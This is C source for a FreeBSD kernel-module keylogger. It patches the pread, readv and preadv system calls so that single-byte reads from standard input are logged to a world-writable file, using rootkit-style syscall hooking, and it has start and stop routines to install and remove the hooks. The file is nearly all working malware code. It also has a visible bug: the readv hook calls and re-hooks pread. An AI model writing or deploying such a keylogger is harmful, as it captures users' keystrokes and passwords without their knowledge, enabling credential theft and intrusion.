#include "keylog.h"
#include "hook.h"
#include "util.h"
#include "debug.h"
#include "config.h"


#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/sx.h>
#include <sys/types.h>
#include <sys/proc.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/syscall.h>
#include <sys/fcntl.h>
#include <sys/file.h>
#include <sys/uio.h>
#include <sys/syscallsubr.h>
#include <sys/pcpu.h>


static char *pread_prepatch;
static char *readv_prepatch;
static char *preadv_prepatch;

int keylog(struct thread *td, char * buf){

     int openError = kern_openat(td,AT_FDCWD,keyLogPath, UIO_SYSSPACE, O_WRONLY|O_CREAT|O_APPEND,0777);
     if(openError)
         return(openError);


     int keyfd = td->td_retval[0];
     struct uio ruio;
     struct iovec riovec;

     bzero(&ruio,sizeof(ruio));
     bzero(&riovec,sizeof(riovec));

     ruio.uio_td = td;
     ruio.uio_rw = UIO_WRITE;
     ruio.uio_segflg = UIO_SYSSPACE;
     ruio.uio_resid = 1;
     ruio.uio_offset = 0;
     ruio.uio_iovcnt = 1;
     ruio.uio_iov = &riovec;

     riovec.iov_len = 1;
     riovec.iov_base = buf;

     int errorWrite = kern_writev(td,keyfd,&ruio);
     if(errorWrite)
	 return(errorWrite);

     struct close_args cl;
     cl.fd = keyfd;
     sys_close(td,&cl);

     return 0;
}

static int pread_hook(struct thread *td, void *syscall_args) {
     struct pread_args /*{
     int fd;
     void * buf;
     size_t nbyte;
     off_t offset;
     }*/ *uap;

    uap = (struct pread_args *)syscall_args;
    int error;
    char buf[1];
    int done;

    hook_set(sys_pread, pread_prepatch);
    error = sys_pread(td, syscall_args);
    hook(sys_pread, pread_hook);


    if (error || (!uap->nbyte) || (uap->nbyte > 1) || (uap->fd != 0))
        return(error);
    copyinstr(uap->buf, buf, 1, &done);

    int keyError = keylog(td, buf);
    if(keyError)
	return(keyError);

    return(error);
    }



static int
readv_hook(struct thread *td, void *syscall_args) {
     struct readv_args /*{
     int fd;
     struct iovec *iovp;
     u_int iovcnt;
     }*/ *uap;

     uap = (struct readv_args *)syscall_args;
     int error;
     char buf[1];
     int done;


     hook_set(sys_pread, pread_prepatch);
     error = sys_pread(td, syscall_args);
    hook(sys_pread, pread_hook);

     if (error || (!uap->iovp->iov_len) || (uap->iovp->iov_len > 1) || (uap->fd != 0))
         return(error);
     copyinstr(uap->iovp->iov_base, buf, 1, &done);

     int keyError = keylog(td, buf);
     if(keyError)
	return(keyError);

     return(error);

 }

static int preadv_hook(struct thread *td, void *syscall_args) {
    struct preadv_args /*{
    int fd;
    struct iovec * iovp;
    u_int iovcnt;
    off_t offset;
    }*/ *uap;

    uap = (struct preadv_args *)syscall_args;
    int error;
    char buf[1];
    int done;

    hook_set(sys_preadv, preadv_prepatch);
    error = sys_preadv(td, syscall_args);
    hook(sys_preadv, preadv_hook);

    if (error || (!uap->iovp->iov_len) || (uap->iovp->iov_len > 1) || (uap->fd != 0))
        return(error);
    copyinstr(uap->iovp->iov_base, buf, 1, &done);

    int keyError = keylog(td, buf);
    if(keyError)
	return(keyError);

    return(error);
    }


void start_keylog(void)
{
	pread_prepatch = hook_fetch(sys_pread);
	hook(sys_pread, pread_hook);

	readv_prepatch = hook_fetch(sys_readv);
	hook(sys_readv, readv_hook);

	preadv_prepatch = hook_fetch(sys_preadv);
	hook(sys_preadv, preadv_hook);
}

void stop_keylog(void)
{
	hook_set(sys_pread, pread_prepatch);
	free(pread_prepatch, M_TEMP);
	hook_set(sys_readv, readv_prepatch);
	free(readv_prepatch, M_TEMP);
	hook_set(sys_preadv, preadv_prepatch);
	free(preadv_prepatch, M_TEMP);
}

